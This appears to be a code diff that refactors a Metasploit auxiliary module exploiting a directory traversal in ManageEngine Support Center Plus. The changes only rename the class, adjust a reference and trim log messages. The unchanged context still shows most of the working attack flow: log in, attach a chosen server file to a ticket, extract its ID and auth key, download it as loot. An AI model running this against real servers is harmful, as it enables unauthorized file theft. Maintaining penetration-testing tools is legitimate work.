@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -29,7 +29,7 @@ class Metasploit3 < Msf::Auxiliary
           ['EDB', '31262'],
           ['OSVDB', '102656'],
           ['BID', '65199'],
-          ['URL', 'http://packetstormsecurity.com/files/124975/ManageEngine-Support-Center-Plus-7916-Directory-Traversal.html']
+          ['PACKETSTORM', '124975']
         ],
       'DisclosureDate' => "Jan 28 2014"
     ))
@@ -48,7 +48,7 @@ class Metasploit3 < Msf::Auxiliary
     uri = target_uri.path
     peer = "#{ip}:#{rport}"
 
-    vprint_status("#{peer} - Retrieving cookie")
+    vprint_status("Retrieving cookie")
     res = send_request_cgi({
       'method' => 'GET',
       'uri'    => normalize_uri(uri, "")
@@ -57,10 +57,10 @@ class Metasploit3 < Msf::Auxiliary
     if res and res.code == 200
       session = res.get_cookies
     else
-      vprint_error("#{peer} - Server returned #{res.code.to_s}")
+      vprint_error("Server returned #{res.code.to_s}")
     end
 
-    vprint_status("#{peer} - Logging in as user [ #{datastore['USER']} ]")
+    vprint_status("Logging in as user [ #{datastore['USER']} ]")
     res = send_request_cgi({
       'method' => 'POST',
       'uri'    => normalize_uri(uri, "j_security_check"),
@@ -76,14 +76,14 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res and res.code == 302
-      vprint_status("#{peer} - Login succesful")
+      vprint_status("Login succesful")
     else
-      vprint_error("#{peer} - Login was not succesful!")
+      vprint_error("Login was not succesful!")
       return
     end
 
     randomname = Rex::Text.rand_text_alphanumeric(10)
-    vprint_status("#{peer} - Creating ticket with our requested file [ #{datastore['FILE']} ] as attachment")
+    vprint_status("Creating ticket with our requested file [ #{datastore['FILE']} ] as attachment")
     res = send_request_cgi({
       'method' => 'POST',
       'uri'    => normalize_uri(uri, "WorkOrder.do"),
@@ -114,21 +114,21 @@ class Metasploit3 < Msf::Auxiliary
       })
 
     if res and res.code == 200
-      vprint_status("#{peer} - Ticket created")
+      vprint_status("Ticket created")
       if (res.body =~ /FileDownload.jsp\?module=Request\&ID=(\d+)\&authKey=(.*)\" class=/)
         fileid = $1
-        vprint_status("#{peer} - File ID is [ #{fileid} ]")
+        vprint_status("File ID is [ #{fileid} ]")
         fileauthkey = $2
-        vprint_status("#{peer} - Auth Key is [ #{fileauthkey} ]")
+        vprint_status("Auth Key is [ #{fileauthkey} ]")
       else
-        vprint_error("#{peer} - File ID and AuthKey not found!")
+        vprint_error("File ID and AuthKey not found!")
       end
     else
-      vprint_error("#{peer} - Ticket not created due to error!")
+      vprint_error("Ticket not created due to error!")
       return
     end
 
-    vprint_status("#{peer} - Requesting file [ #{uri}workorder/FileDownload.jsp?module=Request&ID=#{fileid}&authKey=#{fileauthkey} ]")
+    vprint_status("Requesting file [ #{uri}workorder/FileDownload.jsp?module=Request&ID=#{fileid}&authKey=#{fileauthkey} ]")
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(uri, "workorder", "FileDownload.jsp"),
@@ -151,9 +151,9 @@ class Metasploit3 < Msf::Auxiliary
         data,
         datastore['FILE']
       )
-      print_good("#{peer} - [ #{datastore['FILE']} ] loot stored as [ #{p} ]")
+      print_good("[ #{datastore['FILE']} ] loot stored as [ #{p} ]")
     else
-      vprint_error("#{peer} - Server returned #{res.code.to_s}")
+      vprint_error("Server returned #{res.code.to_s}")
     end
   end
 end
